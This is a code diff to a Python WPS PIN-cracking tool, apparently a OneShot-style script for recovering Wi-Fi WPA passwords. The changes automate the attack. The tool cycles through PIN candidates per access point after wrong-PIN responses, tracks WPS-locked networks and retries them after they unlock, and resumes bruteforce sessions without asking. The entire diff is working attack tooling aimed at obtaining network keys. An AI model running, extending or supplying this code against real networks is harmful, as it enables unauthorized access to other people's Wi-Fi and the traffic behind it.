@@ -18,7 +18,10 @@ from typing import Dict
 import csv
 
 #Auto Mode Hack: Global variable wasted_bssids
-wasted_bssids = []
+wasted_bssids = {}
+locked_bssids = []
+pin_order = [11,1,2,3,4,5,6,7,8,9,10]
+
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -537,7 +540,7 @@ class Companion:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
                 print('[*] Scanning…')
-                self.times-= 1
+                self.times-= args.auto - args.bruteforce
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             if 'msg=5 config_error=15' in line:
                 print('[*] Received WPS-FAIL with reason: WPS LOCKED')
@@ -552,17 +555,20 @@ class Companion:
             elif 'config_error=2' in line:
                 print('[*] Received WPS-FAIL with reason: CRC FAILURE')
                 self.connection_status.status = 'WPS_FAIL'
+            elif 'config_error=18' in line:
+                    self.connection_status.status = 'WSC_NACK'
+                    print('[-] Error: PIN was wrong')
             else:
                 self.connection_status.status = 'WPS_FAIL'
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        #elif 'NL80211_CMD_DEL_STATION' in line:
+        #   print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = (codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape')
                                                 .encode('latin1').decode('utf-8', errors='replace'))
             print('[*] Authenticating…')
-            self.times-= 1
+            self.times-= args.auto + args.bruteforce
         elif 'Authentication response' in line:
             print('[+] Authenticated')
         elif 'Trying to associate with' in line:
@@ -640,6 +646,7 @@ class Companion:
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
+        global wasted_bssids
         if len(pins) > 1:
             print(f'PINs generated for {bssid}:')
             print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
@@ -649,8 +656,16 @@ class Companion:
                     number, pin['pin'], pin['name'])
                 print(line)
             while 1:
-                if args.auto or args.pin_index:
+                if not args.auto and args.pin_index:
                     pinNo = args.pin_index
+                if args.auto:   
+                    if bssid in wasted_bssids:
+                        if wasted_bssids[bssid] is None:
+                            wasted_bssids[bssid] = args.pin_index 
+                        pinNo = wasted_bssids[bssid]
+                    else:
+                        pinNo = args.pin_index
+                    print('Pin Index: ', pinNo)
                 else:
                     pinNo = input('Select the PIN: ')
                 try:
@@ -659,7 +674,8 @@ class Companion:
                     else:
                         raise IndexError
                 except Exception:
-                    print('Invalid number')
+                    print('Invalid number', pinNo)
+                    break
                 else:
                     break
         elif len(pins) == 1:
@@ -701,8 +717,12 @@ class Companion:
                 break
             if self.connection_status.status == 'WSC_NACK':
                 if args.auto:
-                    print ('[i] Adding to Wasted BSSIDs:', bssid)
-                    wasted_bssids.append(bssid)
+                    print ('[i] Adding to Wasted pins:', bssid) 
+                    if bssid not in wasted_bssids:
+                        wasted_bssids[bssid] = args.pin_index
+                    current_index = pin_order.index(wasted_bssids[bssid])
+                    next_index = (current_index + 1) % len(pin_order)
+                    wasted_bssids[bssid] = pin_order[next_index]
                 break
             elif self.connection_status.status == 'GOT_PSK':
                 break
@@ -745,6 +765,7 @@ class Companion:
             self.__wps_connection(bssid, pin, pixiemode)
 
         if self.connection_status.status == 'GOT_PSK':
+            del wasted_bssids[bssid]
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
@@ -784,7 +805,7 @@ class Companion:
                 print('[+] First half found')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print('[!] WPS transaction failed, re-trying last pin - WPS Locked?')
                 return self.__first_half_bruteforce(bssid, f_half)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
@@ -806,7 +827,7 @@ class Companion:
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print('[!] WPS transaction failed, re-trying last pin - WPS Locked?')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
@@ -820,7 +841,9 @@ class Companion:
             try:
                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 with open(filename, 'r') as file:
-                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
+                    if args.auto:
+                        mask = file.readline().strip()
+                    elif input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                         mask = file.readline().strip()
                     else:
                         raise FileNotFoundError
@@ -1052,12 +1075,15 @@ class WiFiScanner:
                 network['Security type'], network['Level'],
                 deviceName, model
                 )
+            if not network['WPS locked'] and network['BSSID'] in locked_bssids:
+                locked_bssids.remove(network['BSSID'])
             if (network['BSSID'], network['ESSID']) in self.stored:
-                print(colored(line, color='yellow'))
-            elif (network['BSSID']) in wasted_bssids:
-                print(colored(line, color='grey'))    
+                print(colored(line, color='yellow')) 
             elif network['WPS locked']:
                 print(colored(line, color='red'))
+                locked_bssids.append(network['BSSID'])
+            elif (network['BSSID']) in wasted_bssids:
+                print(colored(line, color='grey'))   
             elif ((self.vuln_list and (model in self.vuln_list))
                   or self.checkvuln_from_pin_csv(os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                                               'pins.csv'), network['BSSID'])):
@@ -1083,6 +1109,19 @@ class WiFiScanner:
                 else:
                     return networks[int(self.auto_num)]['BSSID'], networks[int(self.auto_num)]['ESSID']
             if args.auto and self.auto_num is None:
+                def get_essid_for_bssid(networks, target_bssid):
+                    for network_id, network in networks.items():
+                        if network['BSSID'] == target_bssid:
+                            essid = network.get('ESSID')
+                            if essid is None:
+                                return network['BSSID']
+                            else:
+                                return network['BSSID'], essid
+                    return None  # Return None if the BSSID is not found
+                for bssid in wasted_bssids:
+                    if bssid not in locked_bssids:
+                        essid = get_essid_for_bssid(networks, bssid)
+                        return bssid, essid
                 if not args.delay:
                     delay = 30
                 else:
